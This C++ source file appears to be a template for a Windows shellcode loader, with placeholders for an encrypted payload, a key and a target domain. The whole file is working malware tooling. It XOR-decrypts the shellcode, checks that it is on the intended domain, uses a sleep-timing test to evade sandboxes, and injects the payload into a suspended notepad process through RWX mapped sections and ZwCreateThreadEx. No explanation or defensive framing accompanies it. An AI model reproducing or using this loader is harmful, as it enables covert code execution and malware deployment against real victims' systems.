#include <cstdio>
#include <windows.h>
#include <winternl.h>
#include <chrono>
#include <thread>

#pragma comment(lib, "ntdll")

// ZwCreateSection
typedef NTSTATUS(NTAPI* pZwCreateSection)(
  OUT PHANDLE            SectionHandle,
  IN ULONG               DesiredAccess,
  IN POBJECT_ATTRIBUTES  ObjectAttributes OPTIONAL,
  IN PLARGE_INTEGER      MaximumSize OPTIONAL,
  IN ULONG               PageAttributess,
  IN ULONG               SectionAttributes,
  IN HANDLE              FileHandle OPTIONAL
);

// NtMapViewOfSection syntax
typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
  HANDLE            SectionHandle,
  HANDLE            ProcessHandle,
  PVOID*            BaseAddress,
  ULONG_PTR         ZeroBits,
  SIZE_T            CommitSize,
  PLARGE_INTEGER    SectionOffset,
  PSIZE_T           ViewSize,
  DWORD             InheritDisposition,
  ULONG             AllocationType,
  ULONG             Win32Protect
);

// ZwCreateThreadEx
typedef NTSTATUS(NTAPI* pZwCreateThreadEx)(
  _Out_ PHANDLE                 ThreadHandle,
  _In_ ACCESS_MASK              DesiredAccess,
  _In_opt_ POBJECT_ATTRIBUTES   ObjectAttributes,
  _In_ HANDLE                   ProcessHandle,
  _In_ PVOID                    StartRoutine,
  _In_opt_ PVOID                Argument,
  _In_ ULONG                    CreateFlags,
  _In_opt_ ULONG_PTR            ZeroBits,
  _In_opt_ SIZE_T               StackSize,
  _In_opt_ SIZE_T               MaximumStackSize,
  _In_opt_ PVOID                AttributeList
);

// ZwUnmapViewOfSection syntax
typedef NTSTATUS(NTAPI* pZwUnmapViewOfSection)(
  HANDLE            ProcessHandle,
  PVOID             BaseAddress
);

// ZwClose
typedef NTSTATUS(NTAPI* pZwClose)(
  _In_ HANDLE       Handle
);


int main(int argc, char* argv[]) {
  HANDLE sh; // section handle
  HANDLE th; // thread handle
  STARTUPINFOA si = {};
  PROCESS_INFORMATION pi = {};
  PROCESS_BASIC_INFORMATION pbi = {};
  OBJECT_ATTRIBUTES oa;
  SIZE_T s = 4096;
  LARGE_INTEGER sectionS = { s };
  PVOID rb = NULL; // remote buffer
  PVOID lb = NULL; // local buffer
 
  ZeroMemory(&si, sizeof(STARTUPINFO));
  ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
  ZeroMemory(&pbi, sizeof(PROCESS_BASIC_INFORMATION));
  si.cb = sizeof(STARTUPINFO);

  ZeroMemory(&oa, sizeof(OBJECT_ATTRIBUTES));

  HMODULE ntdll = GetModuleHandleA("ntdll");
  pZwCreateSection myZwCreateSection = (pZwCreateSection)(GetProcAddress(ntdll, "ZwCreateSection"));
  pNtMapViewOfSection myNtMapViewOfSection = (pNtMapViewOfSection)(GetProcAddress(ntdll, "NtMapViewOfSection"));
  pZwUnmapViewOfSection myZwUnmapViewOfSection = (pZwUnmapViewOfSection)(GetProcAddress(ntdll, "ZwUnmapViewOfSection"));
  pZwCreateThreadEx myZwCreateThreadEx = (pZwCreateThreadEx)GetProcAddress(ntdll, "ZwCreateThreadEx");
  pZwClose myZwClose = (pZwClose)GetProcAddress(ntdll, "ZwClose");

  const char* fqdn = std::getenv("USERDNSDOMAIN");
  const char* targetDomain = "${domain}";

  if (fqdn && _stricmp(fqdn, targetDomain) != 0) {
      return 0;
  }

  using namespace std::chrono_literals;

  auto t1 = std::chrono::steady_clock::now();
  std::this_thread::sleep_for(5s);
  auto t2 = std::chrono::steady_clock::now();
  double deltaT = std::chrono::duration<double>(t2 - t1).count();
  if (deltaT < 4.5)
  {
      return 0;
  }

  // Encrypted shellcode and cipher key obtained from shellcode_encoder.py
  char encryptedShellcode[] = "${shellcode}";
  char key[] = "${key}";

  // Char array to host the deciphered shellcode
  char shellcode[sizeof encryptedShellcode];	
  
  
  // XOR decoding stub using the key defined above must be the same as the encoding key
  int j = 0;
  for (int i = 0; i < sizeof encryptedShellcode; i++) {
  	if (j == sizeof key - 1) j = 0;
  
  	shellcode[i] = encryptedShellcode[i] ^ key[j];
  	j++;
  }
  
  // create process as suspended
  if (!CreateProcessA(NULL, (LPSTR) "C:\\windows\\system32\\notepad.exe", NULL, NULL, NULL, 
      CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
    printf("create process failed :(\n");
    return -2;
  };
  
  myZwCreateSection(&sh, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, &sectionS, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
  printf("section handle: %p.\n", sh);

  // mapping the section into current process
  myNtMapViewOfSection(sh, GetCurrentProcess(), &lb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("local process mapped at address: %p.\n", lb);

  // mapping the section into remote process
  myNtMapViewOfSection(sh, pi.hProcess, &rb, NULL, NULL, NULL, &s, 2, NULL, PAGE_EXECUTE_READWRITE);
  printf("remote process mapped at address: %p\n", rb);
 
  // copy shellcode
  memcpy(lb, shellcode, sizeof(shellcode));

  // unmapping section from current process
  myZwUnmapViewOfSection(GetCurrentProcess(), lb);
  printf("mapped at address: %p.\n", lb);
  myZwClose(sh);

  sh = NULL;
  
  // create new thread
  myZwCreateThreadEx(&th, 0x1FFFFF, NULL, pi.hProcess,
    rb, NULL, CREATE_SUSPENDED, 0, 0, 0, 0);
  printf("thread: %p.\n", th);
  ResumeThread(pi.hThread);
  myZwClose(pi.hThread);
  myZwClose(th);
  
  return 0;

}